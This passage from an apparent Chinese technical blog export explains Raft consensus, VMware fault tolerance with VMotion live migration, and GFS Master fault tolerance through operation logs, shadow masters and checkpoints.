之间出现网络分区，Follwer 们就会因为长时间收不到 Leader 的心跳而选出新的 Leader，此时整个系统就会出现两个 Leader，因为旧的 Leader 可能并没有意识到自己在其他机器看来是下线的状态，这被称为脑裂，是一种因为 Follower 和 Leader 间信息不一致而导致的现象。 所以，一致性算法的出现就是为了解决这类问题，即，在将网络分区或节点宕机等现象视为必然的条件下，保证节点间相互一致，对外继续提供稳定可靠的服务。而 Raft 就是这样的算法。 Raft 概述Raft 是一个非常依赖 Leader 的算法（论文中称之为 Strong leader），所以它本身就是一个单 Leader 多 Follower 的系统，和一般系统所不同的是，为了保证一致性，它的读写都需要通过 Leader 来进行。这个算法服务于分布式状态机，Leader 以日志的方式向 Follower 发送状态的变化，并以“所有节点中的大多数所达成的一致”作为整个系统的一致。也就是说，如果整个系统中有 3 个节点，那么只要 2 个节点达成一致，就认为整个系统是一致的，与之类似的，如果整个系统中有 5 个节点，那么至少需要有 3 个节点达成一致。反过来讲，5 个节点的系统最大可以容忍 2 个节点失效。 通常而言，Raft 的节点数是奇数，多为 3 个或 5 个，因为 Raft 其实是一个节点间通讯非常频繁的系统，它需要保证整个集群中的任意两个节点都可以发起 RPC 通信，所以如果集群中节点数量很多，那么节点间的 Raft 通信本身就是网络的一个压力来源。正是由于节点的数量并不多，所以采用 Raft 的系统并不会直接作为用户使用的大流量一致性存储系统，而是作为一个协调系统，帮助其他系统简单而可靠地达成一致。 节点状态与通信在 Raft 中，时间被划分为一个个任期，每个任期通过一个递增的数字来标明。Raft 的节点被分为三种状态，分别是 Leader，Follower 和 Candidate，各自的说明如下： Leader：整个系统的老大，客户端的读写都通过它来进行，应用层的状态由它说了算 Candidate：有机会成为老大 Follower：老大的小跟班，有时会成为 Candidate 三类节点的任意两两间都可以通过 RPC 进行交流。要想实现 Raft 的基本功能，只需要有两种 RPC，这两种 RPC 都会携带发送者认为的当前的任期号，仅当这个任期号大于等于接受者的任期号时，请求才被视为有效的。论文的 Figure2 中有两个 RPC 详细的参数说明，所以这里仅简单说明下对应的功能： AppendEntries：发送日志、说明已提交的日志位置、心跳检测，由 Leader 发起 RequestVote：发起投票，由 Candidate 发起 当一个节点刚刚加入到 Raft 集群中时，它的状态是 Follower，这种状态的节点会维护一个计时器，在计时器到期之前它需要收到来自 Leader 的 AppendEntries，如果成功收到，那么它会重置计时器，等待下一个 AppendEntries 的到来，这个状态会一直重复下去。另一方面，如果计时器到期，那么节点就从 Follower 转换为 Candidate。这时它会给自己投一票，然后对其他节点发出 RequestVote。如果它能够收到集群中大多数节点的认可，那么它的状态就会变为 Leader。Leader 节点负责与客户端通信，并将状态的变化以日志的方式通过 AppendEntries 发送给其他节点。 上面描述的是一般情况下节点的状态变化，但是如前所述，其实任意状态的两个节点都可以进行 RPC 交流。比如 Leader 在发送 AppendEntries 时并不区分接受者的状态，所以 Candidate 也是可以收到 AppendEntries；与之类似的，Candidate 在发送 RequestVote 时也不区分接受者的状态，所以 Leader 也可以收到 RequestVote。作为一个接受者，不论它收到的是什么 RPC，也不论它当前是什么状态，如果 RPC 参数中的任期号大于它当前所记录的任期号，那么它就会变为 Follower，因为集群中的有效任期号以节点中最大的那个为准，所以小于这个任期号的节点都被视为过期。 另一方面，当多个节点同时变为 Candidate 并发起 RequestVote 时，就很有可能无法选出 Leader。比如 5 个节点中有 4 个都变为 Candidate，那么它们会分别给自己投一票，但是 Raft 规定，每个节点在同一个任期中只可以给一个节点投票，所以不论最后的那个节点把票投给谁，集群中都最多只能达成“两个节点投票给同一个节点”，而这并不符合“大多数”的 3 个节点。所以为了避免这种情况，Raft 规定 Follower 的计时器时长应该为一定范围内的随机值，并且当 Follower 收到 AppendEntries 并重置计时器时，也会重新计算一个新的随机值，从而通过这种随机性来打散节点变为 Candidate 的时机，以尽量避免前文所述的多个节点同时变为 Candidate 的情况。 此外，作为一个分布式系统，支持节点的数量变化也是一种刚需。Raft 的很多机制都离不开“大多数”，但节点的变化就可能导致出现多个“大多数”。举例来说，一个 3 节点的 Raft 集群被增加为 5 个节点，那么这个增加操作也需要得到大多数节点的同意。我们将节点从 1～5 编号，假设前 3 个是原有的节点，4、5 是新加入的节点。那么很可能 2、3 是同意增加节点的，它们会和 4、5 一样，认为此时 3 个节点的一致性才是集群的一致性。但 1 由于一些原因还没有同意增加节点，此时它还是认为集群中只有 3 个节点，所以只要有 2 个节点达成一致，那么整个集群就是一致的。 这会导致什么问题呢？如果 1 和 4 同时发起选举，1 很可能共得到 2 个投票，4 则会得到 3 个投票，由于实际集群中有 5 个节点，所以 4 会成为 Leader 是符合 Raft 对大多数的定义的；但由于 1 仍然认为集群中只有 3 个节点，所以它也会成为 Leader。同一个集群中出现了两个 Leader，也就是发生了脑裂，Raft 作为一个对 Leader 强依赖的算法，在这样的情况下就无法保证一致性了。 怎么解决这个问题呢？Raft 提供了两种思路，这里仅对易于工程实现的思路做解释。具体来说，Raft 规定不论是增加节点还是删除节点，每次都只能操作一个节点。这就可以保证即便集群中的节点对节点总数的判断不一致也不会出现脑裂的情况，因为整个集群中对于“大多数”的判断只会有两个答案，比如原来有 4 个节点，为了选出 Leader 就需要获得 3 个节点的投票，现在变成 3 个节点就需要获得 2 个节点的投票，而两类节点的“大多数”之和会大于原来集群中节点的数量，即 2 + 3 = 5 &gt; 4，所以一定会有一个节点同时属于两个“大多数”，这个节点就是非常关键的角色，它的投票会影响系统的最终结果。如前所述，节点数量的变化需要经过“大多数”节点的同意，所以这个关键的节点一定知道集群数量的变化，那么它一定会把票投给知道集群数量变化的那个 Candidate 来帮助它成为 Leader。 可以证明，对于新增节点的场景也是类似的，那个关键的节点会把票投给更新的 Candidate。怎么定义哪个 Candidate 更新呢，要用它所拥有的日志来判断。 Raft 的日志我们前面提到，Raft 算法是服务于分布式状态机的。那么对于状态机本身而言，就需要有一种机制可以同步状态的变化，通常而言就是日志。与客户端直接交互的节点会更新自己的日志，然后将新的日志同步给其他的 replica 们，这些 replica 接收到日志后在本地重放（replay），最终其内部的状态就会与其他节点达成一致。 发送日志的时机取决于系统本身的要求，我们曾讨论过同步发送和异步发送的利弊。对于 Raft 这样一个聚焦于一致性的算法，它选择在执行命令前先同步日志，也就是所谓的 WAL。但与其他系统不同的是，Raft 在日志同步上也仅需要达成大多数的一致，比如集群中有 5 个节点，那么它只需要成功同步给其中的 2 个节点，加上它自己本地的一份，整个集群中就有 3 个节点对日志达成一致，这在机制上就可以保证一致性了。通过这种方式，采用 Raft 的系统在同步日志的效率上不会受制于那些 struggler，也就是因为各种原因显著慢于其他节点的节点。 我们前面提到为了保证一致性，采用 Raft 的系统的读写都要通过 Leader 来完成。我们假设使用 Raft 的是一个分布式 kv 系统，那么它所支持的最基本的操作就是 get/set。当一个节点成为 Leader 后，它就会开始接收来自客户端的请求。收到请求后，Raft 模块会把这个命令以 Log Entry 的形式追加进自己的本地日志中，然后发送 AppendEntries 的 RPC 来将日志同步给其他节点，当收到大多数节点的同意后，Raft 模块会把相关状态同步给应用层，在这种情况下应用层就会将命令的效果应用在本地状态机中，然后把最终结果返回给客户端。 每个 Log Entry 会有它自己的下标、创建它时系统的任期号（是当时的 Leader 以为的任期号，实际可能不准确）以及包含的命令。通常情况下，Leader 和 Follower 的日志应该是一致的，但 Raft 把不一致视为必然现象，那么怎么定义不一致呢，大体有两类。首先第一种就是日志的长度不一致，比如前面提到的 struggler，这些节点通常只有 Leader 节点上前半部分的日志，后面的部分由于各种原因还没有被同步过来；另一种就是同一个下标对应的 Log Entry 不同，导致这一现象的原因有很多，比如 Leader 收到命令 put x 1 来将 x 写入 1，但它在将对应的 Log Entry 追加到本地后就发生了网络分区，在它离线期间其他节点中选出了新的 Leader，并收到了 put x 2 的命令并成功同步，此时旧的 Leader 在同样的位置上的 Log Entry 就与其他节点不一致。 Raft 怎么处理这种不一致呢？首先在前面我们提到，选举 Leader 时，节点在投票时要考虑两方面的因素，第一是目标 Candidate 的本地任期号是否大于自己，第二是目标 Candidate 是否有比自己更新的的日志。这里的更新有两个含义，如果 Log Entry 的任期号相同，那么具有更大下标的日志更新；如果日志的下标相同，那么具有更高任期号 Log Entry 更新。可以发现，这其实就是对齐了前面提到的两种不一致。因为只有具有更新的日志的节点才有机会成为 Leader，而客户端的读写又通过 Leader 进行，所以客户端还是可以读到更新的结果。另一方面，Leader 采用 AppendEntries 来做心跳检测，这个 RPC 本身就是用来同步日志的。通过这个机制，Leader 是可以发现 Follower 的日志与自己日志间的不一致的。在这种情况下，Leader 会对不一致的部分进行调整，少日志就加，错日志就覆写，最终 Follower 的日志状态就会和 Leader 达成一致。 和其他依赖日志的系统一样，随着系统的运行日志会变得越来越大，最终耗尽持久化设备的空间。Raft 对这种问题的解决方案是 snapshot，就是把当前已有的日志通过某种方式变成一个等价的、但是占用空间更少的表现形式，实现这种效果的方案有很多。比如对于一个使用 Raft 的分布式 kv 系统而言，就可以采用类似 Redis 的 AOF 重写的机制。具体而言，如果日志中的内容包含对同一个键的一系列操作，那么最终有效的其实只有最后一个操作，所以只需要在日志中保留这个值的最终状态即可。论文中把这个操作称为 Log Compaction，也就是日志的“压实”，我觉得这个词还是非常贴切的。 那么会不会出现经过 Log Compaction 后，日志占用的磁盘空间还是很大的情况呢？我觉得这种情况是很少的，因为如果距离上一次压实后（我们称它为 snapshot）并没有新的命令被执行，那么实际上内存中的状态和 snapshot 是一致的。对于一个使用 Raft 的分布式 kv 系统而言，snapshot 里记录的大概就是每个 key 对应的 value 是什么，这和内存中的信息是一样的，如果这些信息都可以被保存在内存中，那么保存在持久化设备上就不是什么大问题了。 一些细节接下来讨论一些其他方面的问题。 首先，我们前面提到，为了保证一致性，采用 Raft 的系统的读写都需要在 Leader 上进行，但是读操作为什么需要呢？可以确定的是，从 Raft 系统中读出的内容一定是被“大多数”节点承认的内容，因为只有被多数节点承认，这个内容才会被应用到状态机中。但是尽管这个内容是被承认的，它也有可能是过期的，比如如果允许从 Follower 上读取内容，那么与客户端交互的有可能就是一个 struggler，也就是说它内部的日志是延后于其他节点的。那么此时客户端通过它来读取，就可能读到曾经的某个时刻有效、但是在当前实际已经被修改的值。而这其实就回到了主从复制系统的一个共有问题，也就是同步延迟带来的问题，一些业务场景是可以容忍这短暂的不一致的。因此，如果不要求读的强一致性，那么读操作也不是一定要发生在 Leader 上的。 那么，是不是只要从 Leader 上读取，就一定可以读到最新的内容了呢？原理上是这样的，但是问题在于 Leader 并不能很轻易地判断它自己是不是 Leader。比如说，曾是 Leader 的节点与其他节点间发生了网络分区，导致其他节点因为收不到它的心跳而开始选举新的 Leader，并在选举成功后写入了新的内容。那么对于那些还在与旧 Leader 交互的客户端而言，它们与旧 Leader 都没有意识到新 Leader 的产生，如果此时旧 Leader 直接从自己的状态机中取出对应的状态返回给客户端，那么这其实就和上面提到的直接从 Follower 上读取是一样的场景了。 所以为了保证一致性，读操作也要写入日志，并且通过 Raft 模块同步到其他节点上，只有得到多数节点的同意，Leader 才能确保它确实是 Leader，然后放心地将自己状态机中的状态返回给客户端。把读操作放进日志中可能看起来有些奇怪，但是本身日志的内容就不是既定的，比如 etcd 的 Raft 模块中甚至有 Dummy Log Entry，用来避免论文 Figure8 描述的现象，这里就先不展开了。 另一个问题是，当客户端发送了更新状态的命令给 Leader，那么 Leader 将其写入日志后会同步到其他节点，如果同步失败了会怎样？当有新的客户端发送其他更新状态的命令时，Leader 会用这个命令对应的日志将前面同步失败的日志覆盖掉吗？对于这个问题，论文的 Figure3 里明确说明了 Leader 是 Append-Only 的，也就是不会覆写自己日志中已有的内容（但是会覆写其他节点的，因为它是老大它说得算）。可是，这样一来不就有脏数据在日志中了吗，因为同步失败时 Leader 会返回客户端命令执行失败，但是经过几轮心跳检测的 AppendEntries，这个当时被认为失败的日志还是会被同步并应用到其他节点的状态机中，此时系统的状态就和客户端预期的不一致了。 我觉得这个问题还是应该看具体的场景，比如还是以分布式 kv 系统举例，那么客户端在收到命令执行失败的响应后可以直接发起重试，因为它的操作是幂等的，这次重试对应的日志会被放在失败的那条日志后面，并且被同步到其他节点上，这时的这个日志是被认为有效的，前面的那条被客户端认为失败的日志可以简单地理解为被后面的日志覆盖掉了，这其实也是 kv 系统的日志可以做 Log Compaction 的原因，因为对于同一个 key 而言，最后一次的操作才是其最终的状态。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"浅析虚拟机容错与不停机迁移","slug":"vm-ft","date":"2022-07-12T04:43:57.000Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"2022/07/12/vm-ft/","link":"","permalink":"/2022/07/12/vm-ft/","excerpt":"","text":"VMware-FT 论文下载：下载链接 VMware-VMotion 论文下载：下载链接 前言自 4.0 版本开始，VMware vSphere 平台提供虚拟机的容错（VMware vSphere Fault Tolerance）功能，该功能参考了复制状态机（RSM）模型，实现了两台单核虚拟机的状态同步。同步的结果是当作为 primary 的虚拟机宕机时，曾经的 backup 虚拟机可以快速接替它成为新的 primary，而这种切换对上层应用是透明的。对于后人来说，这是一个学习复制状态机模型的绝佳例子，本文将记录我在阅读相关论文时的一些思考与总结。 复制状态机概述在前面讨论 GFS 时我们提到，为了避免 Master 造成单点故障，GFS 以同步+异步的方式将 primary Master 的操作日志发送到其他服务器上，这些服务器通过回放（replay）接收到的操作日志，就可以达成和 primary 一致的状态。 这种通过传递操作在多个节点间达成一致的方式就被称为复制状态机，与之相对的还有一种同步方式叫做“状态复制”，这种方式通过传递状态来达成一致，在 GFS 的场景下 checkpoint 的传递就可以理解为是一种“状态复制”。所以相对而言，复制状态机每次传递的数据量是比较小的。 复制状态机的总体思路是这样的，如果两个状态机从同一个状态开始接收一系列相同的确定性输入，那么它们最终会达成相同的状态。什么叫做确定性输入呢，比如我们有函数 Now() 用于获取调用这个函数时系统的时间，那么“调用 Now()，并将它的返回值赋给 X”这个操作就不是确定性的，因为两个状态机可能会在不同的时间收到这个指令，而指令执行时间的不同会导致 Now 的返回值不同，进而导致 X 的值不一致。 所以利用复制状态机来做状态同步的系统需要特别处理那些不是确定性的输入，比如在 primary 上执行“调用 Now()，并将它的返回值赋给 X”这个指令，但是记录下 Now 的返回值，比如是 123456，然后在 backup 上则执行“将 123456 赋值给 X”的指令，从而达成两个状态机的同步。 VM FT 原理论文第 4 节给出了两种非默认的实现，为了方便，这里仅讨论 VM FT 的默认实现，也就是 Shared Disk 以及不在 backup 上执行实际的读盘操作。 首先要明确的是，VMware vSphere 是一个全虚拟化平台，这意味着虚拟机看到的 cpu、内存、外设等都是由 Hypervisor 模拟出来的，因此虚拟机的方方面面对 Hypervisor 而言都是可见且可控的。在这样的虚拟化方案下，如果将 VM FT 的功能实现在 Hypervisor 上，就可以达到“任何操作系统不经过任何改动就可以使用 VM FT 的功能”的效果。 总体而言，vSphere 会被部署在集群上，集群中的每个物理节点运行 Hypervisor，Hypervisor 上运行各个虚拟机。Hypervisor 本质上只是服务器上的进程，所以对于一个开启了 VM FT 的虚拟机而言，它的 primary 和 backup 不应该被运行在同一台物理机上，因为一旦这个物理机宕机，primary 和 backup 就同时失效了。 primary 虚拟机所在的 Hypervisor 会与 backup 所在的 Hypervisor 通信，这种通信是通过在 Logging Channel 上传输 Log Entry 来实现的。所有的外部输入都会被发送到 primary，而 primary 将输入封装成确定性的 Log Entry 发送给 backup，所以 backup 的状态变化是由 primary 发来的 Log Entry 驱动的，它本身不直接接受外部输入。而对外的输出同样都由 primary 产生，backup 的输出会被 Hypervisor 直接屏蔽掉。 在默认实现上，集群中的物理节点使用 Shared Disk，这可能是 NFS 或 iSCSI 协议背后的存储集群。通过共享存储，primary 虚拟机不需要将磁盘变化同步给 backup，这一方面减少了状态同步的开销，一方面又可以为存储集群配置单独的容错策略，从而和应用解耦。 那么 backup 如何知道 primary 发生错误导致退出了呢？首先，primary 执行过程中遇到的中断也同样会被发送给 backup，而在所有的中断中，时钟中断是会定期发生的，所以如果 primary 能够正常执行，由于时钟中断的存在，backup 不会很长时间收不到 Log Entry。反过来说，如果 backup 很久（理论上指大于“两次时钟中断之间的间隔时间加网络传输时间”的时间，但论文中说通常设为几秒）没收到 Log Entry，那么就可以认为 primary 出了问题，此时 backup 会接替它成为 primary。除了这个机制，vSphere 还让 primary 和 backup 的 Hypervisor 保持心跳检测，以进一步检测 primary 的问题。 这一切都显得非常美好且合理，但是正如前文所述，除了让两个复制状态机保持接收相同的确定性输入外，它们还需要从一个相同的状态开始接收才可以保证它们进入到相同的新状态。但是当 primary 异常，backup 成为新的 primary 时，系统需要创建一个新的虚拟机并让它成为新的 backup。这个新的虚拟机要如何才能达成与当时的 primary 一致的状态呢？这就是 VM VMotion 的工作了。 VMotion 原理VM VMotion 需要做到的是将某个虚拟机从其所在的源物理机上迁移到另一台物理机上，在迁移过程中不需要完全停机，虚拟机的使用者也很难感知到这个迁移动作的发生。 那么迁移具体指什么呢？本质上讲，这个过程是在另一台物理机上启动一个新的虚拟机，但是这个虚拟机的 cpu、外设、网络、硬盘、内存状态都与源虚拟机完全一致。如果将源虚拟机删除，那么这被称为迁移，如果保留源虚拟机，那么这被称为克隆。VM FT 使用的是克隆，但是其原理和迁移几乎是一样的，所以后面的讨论中以迁移举例。 大体而言，VMotion 会经历如下步骤： 选定需要被迁移的虚拟机以及目标物理机； 在保持虚拟机运行的状态下，预复制（Pre-copy）虚拟机的内存到目标物理机上； 暂停虚拟机的运行，然后复制除内存外的其他状态，这通常只需要很短的时间； 复制剩余的内存，然后在目标物理机上让虚拟机运行。 可以发现在整个过程中，有两个阶段都是针对内存的复制。之所以会有这样的情况，是因为内存其实是最难被复制的状态，因为首先内存的容量通常都比较大，这使得先暂停虚拟机再复制内存的方式变得不可行，因为复制所需的时间会很长，导致虚拟机停机的时间也会很长，这对虚拟机中的应用而言是不可接受的。另一方面，内存又是一个会随着虚拟机的运行而不断变化的组件，所以虚拟机是一定要被暂停的，否则传输变化的速度很难超过产生变化的速度，这样永远都不能完成迁移。 那么为了尽可能减少对虚拟机内应用的影响，就需要让虚拟机暂停的时间尽可能少，如何做到这一点呢？答案是局部性原理。具体而言，操作系统把内存按页划分，在很短的时间中内存的变化会聚集在几个页面里。基于这个原理，我们就可以在不停机的状态下先将完整的内存空间复制到目标物理机上，由于完整的内存很大，这通常是一个比较耗时的操作。而每个页面在传输后一旦发生变化就会被记录下来，这对一个全虚拟化平台而言可以很容易地做到。在上面的第 3 步时，为了复制除内存外的其他状态（比如虚拟 cpu 中各个寄存器的值），就需要将虚拟机暂停，到此为止我们已经记录了一些变化过的页面，而由于虚拟机已经暂停，从此之后就不会再有变化的页面。此时系统就可以将这些变化的页面传输到目标物理机上，如前所述，由于局部性原理，这些页面的数量通常是比较少的，所以传输它们并不会花太多时间。 相较于内存，网络和存储就没有那么困难了。尤其是存储，因为我们使用 Shared Disk，所以只需要让被复制的虚拟机连接存储集群就可以了。而对于网络而言，由于虚拟机的网卡是被 Hypervisor 模拟出来的，多个虚拟网卡可能共享同一个物理网卡，所以不管迁不迁移，物理网卡都照常首发网络包，只是它到虚拟网卡的映射被 Hypervisor 修改，使得网络包被发送到了新的虚拟机上。 由于网络流量可以平滑地被迁移到另一台虚拟机上，而这台虚拟机又有着与源虚拟机完全相同的内存状态，这意味着它们打开的 TCP 连接等状态也是一致的，所以应用并不会因为迁移操作而受到什么影响。 所以总结来说，VMotion 可以创建一个与源虚拟机完全一致的复制虚拟机，这使得复制状态机“一致的初始状态”的条件就可以通过它来达成了。 VM FT 的一些细节Hypervisor 为开启 VM FT 的虚拟机维护了一个 Buffer 用于发送和接收 Log Entries。Primary 将状态变化（具体内容见下文）封装成确定性的 Log Entry，然后写入到 Buffer，通常情况下它完成这个写入就可以继续执行。Buffer 有点类似于 TCP 的滑动窗口，里面的 Log Entry 会被异步发送到 backup 的 Buffer 中。每当 backup 处理一个 Log Entry，它就会返回一个 ACK 给 primary，论文中重点强调了这个 ACK 对 Output Rule（见下文）的作用，但我猜 primary 虚拟机的 Buffer 中 Log Entry 应该仅在收到 ACK 时才会被删除，从而留出空间放新的 Log Entry。因为 TCP 只能保证网络包被送达，但是不能保证里面的内容被放入 Hypervisor 为 backup 提供的 Buffer 中。 所以，由于发送速度和处理速度的不均等，primary 的 Buffer 可能会满，backup 的 Buffer 也可能会空。当 backup 的 Buffer 为空时，它需要被暂停执行，与之类似的，当 primary 的 Buffer 为满时，它也需要被暂停执行。在这个过程中，backup 的暂停不会对上面的服务产生影响，因为用户仅与 primary 打交道，他甚至意识不到 backup 的存在，但 primary 的暂停却实打实地会影响到用户的体验。为了避免 primary 比 backup 快出太多，系统会检测它们之间的距离，并在超过一定值时降低 primary 的执行速度，等 backup 追赶上 primary 时再将速度恢复。 说了这么多，那么 Log Entry 到底包含什么内容呢？论文对此并没有给出说明，但 VM FT 是基于复制状态机模型的，所以它不会传递诸如寄存器的值、内存状态等，这些状态的同步通过让两台虚拟机接受相同的确定性输入与事件来达成。 如 2.1 小节所言，输入主要指网络包、读盘、键盘鼠标输入等，事件则主要指中断。其实由于默认配置下 backup 并不会真的读盘，所以它会“读到什么内容”也是通过 Log Entry 来同步的，即如果 primary 读盘获取到了内容 ABCD，那么这个内容会被写入 Log Entry，backup 的 Hypervisor 会通过模拟来让 backup 以为自己读盘并获取到了 ABCD 的内容。与之类似的，由于 backup 也不会收到其他的外设发送的内容，所以这些信息也是通过 Log Entry 来显式传递并被模拟的。 对于中断，要求要更严格一些。首先，操作系统本身其实就是一个被各种中断所驱动的大循环体，所以要想保证两个操作系统的状态一致，那么“在什么指令处发生了什么中断”必须是严格一致的。怎么保证这一点呢，我推测每个 Log Entry 都记录了它被发送时 primary 执行到了什么阶段，而 backup 在重放这个 Log Entry 时，最多只能执行到同样的阶段，也就是说，Log Entry 对 backup 而言就像是调试代码时的断点，backup 的执行并不是连续的。即便 primary 不接受任何的外部输入，由于时钟中断的存在，backup 也能以此来同步 primary 的执行。 此外，虚拟机在读盘时可能会使用 DMA 等异步传输技术。这意味着在虚拟 cpu 收到中断前，有一块内存区域是被协处理器写入的。如果此时我们主动去读取这部分内存，那么由于并发读写的原因获得的结果就会是不确定的。为了避免这样的情况，VM FT 使用 bounce buffer 来处理。具体来说，它使用另一块内存空间用于供协处理器使用 DMA 来读写内容，这块空间对虚拟机而言是不可访问的，在读盘结束时协处理器会触发中断，此时由 Hypervisor 主动将这块内存中的内容拷贝到虚拟机内存中供应用访问，这份内容同样会以 Log Entry 的形式同步给 backup。这其实有点像 MVCC，在整个过程中，虚拟 cpu 与协处理器接触的区域是不一样的，所以它们互不影响。 从上面的描述中可以发现，primary 几乎以异步的方式使用 Logging Channel 来向 backup 同步状态，在之前讨论 GFS 时我们提到，异步同步的缺点在于不能确定操作什么时候被同步以及是否同步成功。那么这种方式会不会造成什么问题呢？考虑这样一个场景，primary 从硬盘读取一些内容，再在相同的地方写入新的内容。这时由于 primary 和 backup 的执行存在时间差，可能 backup 会在 primary 执行写入之后才进行读取，那么此时 backup 读到的内容是否会与 primary 读到的不一致呢？在我们当前的所有讨论中，都以 VM FT 的默认实现方式为准，这种实现方式中 backup 并不会真的去读盘，它读取到的内容实际是被 primary 显式传输再被自己的 Hypervisor 模拟的。也就是说，primary 读取到内容 123，它会发送“让 backup 在 X 这个执行阶段从硬盘中读到 123”这种语义的 Log Entry，backup 的 Hypervisor 在收到它时，会欺骗 backup，让它以为自己真的读取了硬盘并从中获取了 123 这个内容。因为 backup 并不会读盘，所以即便此时硬盘上的内容被更新为 456，也不会对 backup 在 X 这个执行阶段产生任何导致不一致的影响。 另一方面，primary 也不是完全异步地在使用 Logging Channel 的，除了在 Buffer 满时要停下来等待，VM FT 还设置了 Output Rule 的限制。这个限制要求 primary 的所有输出都要在收到 backup 的 ACK 时才能被发送，所以如果用户与 primary 交互并获得了它的反馈时，这个反馈前的所有 Log Entry 都被 backup 重放过了。而这其实就足够了，因为在此之后即便 primary 崩溃了，backup 与 primary 的不一致也不会被用户感知到，因为这种不一致是从上一次的输出开始的，而下一次的输出取决的是当时的 primary，谁又能知道它是谁呢？","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"浅析 Google File System（三）","slug":"GFS3","date":"2022-07-05T14:10:36.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/07/05/GFS3/","link":"","permalink":"/2022/07/05/GFS3/","excerpt":"","text":"前言前两篇文章主要讨论了 GFS 的架构以及其提供的各种操作的原理，在理想状态下这些组件与功能已经足够上层应用使用了。但是正如论文第 1 节中所描述的，GFS 是工作在上千台普通机器上的分布式系统，所以它应该将“组件会出错”看作是普通事件而不是异常。基于这个理念，GFS 提供了一些机制，以尽可能地减小组件出错对整个系统的影响，本文对此进行讨论。 Master 的容错绝大多数分布式系统都使用 replica 来避免因一个组件或数据发生损坏而影响整个系统，这些 replica 之间通过与 primary（即所有副本中最有发言权的那个）共享一些信息来维持相互之间的一致性，这个共享通常发生在 primary 发生变化时，所以共享的信息就是“发生了什么变化”，具体的形式见下文。传递变化的方式有两种，即同步与异步。 如果采用同步的方式，那么 primary 的操作就会被拖慢，因为它需要等待所有参与共享的 replica 都收到变化并给出响应后才认为操作完成，但更慢的操作带来的是明确的结果，即 primary 可以得知每个 replica 对这次变化的反应；与之相对的，异步传递变化不会对 primary 的操作有明显的时间影响，但 primary 也很难明确地知道其他 replica 对这次变化的反应。 正因为这两种共享方式各有利弊，所以 GFS 对 Master 同时应用了它们。具体来说，Master 会将元信息的变化同步通知给一些机器，这些机器只负责接受这些信息并保存，在 primary 正常时这些机器上并没有另一个 Master 进程。而一旦 primary 发生故障且不可以通过重启本机 Master 进程来恢复，监控系统（这个系统独立于 GFS，也是 Google 内部的一个基础设施）就会在某台此前接收变化的机器上启动一个新的 Master 进程，这个进程在启动后读取之前接收的所有变化，这些变化可以帮助它构建元信息从而变成可以提供服务的状态，此后它将作为 primary 来继续响应客户端的各种请求。 然而由于每台机器的 IP 都是分配好的，在新的机器上启动 Master 就代表着访问 Master 的 IP 会发生变化，为了避免客户端和 ChunkServer 因此而重启，GFS 中使用 DNS 来访问 Master，而一旦 IP 发生变化，这条 DNS 记录就会被修改，由此也就完成了流量的切换。其实这种使用可控的内部 DNS Server 来向上层屏蔽 IP 变化的理念在很多项目中都有用到（比如 K8S），与之类似的还有 Virtual IP 的概念，非常有趣。 同步传输可以保证目标机器一定收到了 primary 的变化，而这些变化又可以帮助新的进程达到和曾经的 primary 同样的内部状态，这样的机制已经将 Master 的故障带来的影响降得很低。但是，为了获得一个可用的新的 Master，整个系统要经历原机器上 Master 进程的重启、选择新机器、新机器上启动 Master、新 Master 读取变化恢复状态、修改 DNS 记录、ChunkServer 上报位置信息等一系列操作，这其实是一个非常耗时的过程，而如果整个系统对 Master 仅有这一种容错机制，那就代表着在这么长的恢复时间中，GFS 将处于一个完全不可用的状态（这里不考虑客户端可能有一些缓存信息，使它暂时不需要与 Master 交互），这是不可忍受的。 因此，GFS 提供了一种 Shadow Master 的机制，具体而言，整个集群中除了 primary 外还有一些机器上运行着 Master 进程，primary 在产生变化时将变化信息异步传递给这些机器，运行在这些机器上的 Master 进程就可以 replay 这些变化，从而达到和 primary 同样的状态。如前所述，异步传输会导致一定的延迟，但这种延迟对 GFS 而言是可以接受的，一方面和变化的内容有关，这个在后文会给出解释；另一方面，这些 Shadow Master 是只读的，也就是说它们只能接受来自客户端的读请求，所以异步传输导致的延迟不会让系统变得混乱（因为没有“写”操作），而客户端要想因这个延迟读取错误的内容，首先需要 primary 发生故障，其次 Shadow Master 还没有同步完相关变化，最后读取的部分恰好要在没同步完的区域中，这已经是很小的概率了。 说了这么多，那么 primary 和其他 replica 究竟同步了什么呢？答案是操作日志，它的原理有点像 InnoDB 存储引擎的 redo 日志，只不过 GFS 的操作日志记录的是元信息的变化。元信息指的就是 Namespace、文件到 chunk handle 的映射以及 chunk 的位置信息，GFS 只记录前两种，最后一种依赖 ChunkServer 的上报。 GFS 提供的很多操作接口都会让元信息发生变化，而一旦它们发生变化，Master 首先要做的就是将它们的变化写入到操作日志中，然后将它们同步发送给一些备份用机器，再异步发送给运行着 Shadow Master 的机器。无故障地做完这些，Master 才会做实际的动作，并响应客户端的请求。这种“先写日志再做操作”的方式被称为 Write Ahead Log，简称 WAL，是一种被广泛应用在各个知名项目中的技术。 操作日志的 replay 可以帮助备份的 Master 进入到一个可用的状态，但如果仅靠这个机制还是有一些问题。比如如果持续地对元信息做修改，就会让操作日志越来越大，时间长了这就是一个很大的存储开销。另一方面，如果每次备份 Master 都需要从操作日志的第一条开始 replay，那么当日志非常长时，这个恢复操作就会非常慢。为了解决这个问题，GFS 又实现了 checkpoint 的机制，原理上还是和 InnoDB 类似，其实也是一种被广泛应用于各个项目中的技术。 具体而言，当操作日志达到一定大小后，GFS 会对 Master 当前的状态做一个 checkpoint，这个 checkpoint 可以快速地让 Master 进入这个确定的状态，论文中的描述是 checkpoint 的组织方式可以快速被映射到 Master 进程的内存空间中。checkpoint 和操作日志一样会被发送到其他机器上供其他 replica 使用。对于一个备份 Master 而言，它在启动时只需要使用最新的 checkpoint 恢复到对应的状态，然后 replay 这个时间点以后的所有操作日志即可，相对于前面提到的从第一条操作日志开始 replay，这种新的方式可以大大减少 Master 的恢复时间。而最新的 checkpoint 之前的所有 checkpoint 与操作日志都可以被删除（当然也可以留着做更好的容错），从而释放出对应的存储空间。 ChunkServer 的容错ChunkServer 的容错表现在当某些 ChunkServer 进程崩溃或其所在的机器损坏时，整个系统依然能够完成对 所有 chunk 的读写操作。在前面的博文中曾提到，这其中最重要的在于 chunk 的 replica。 replica 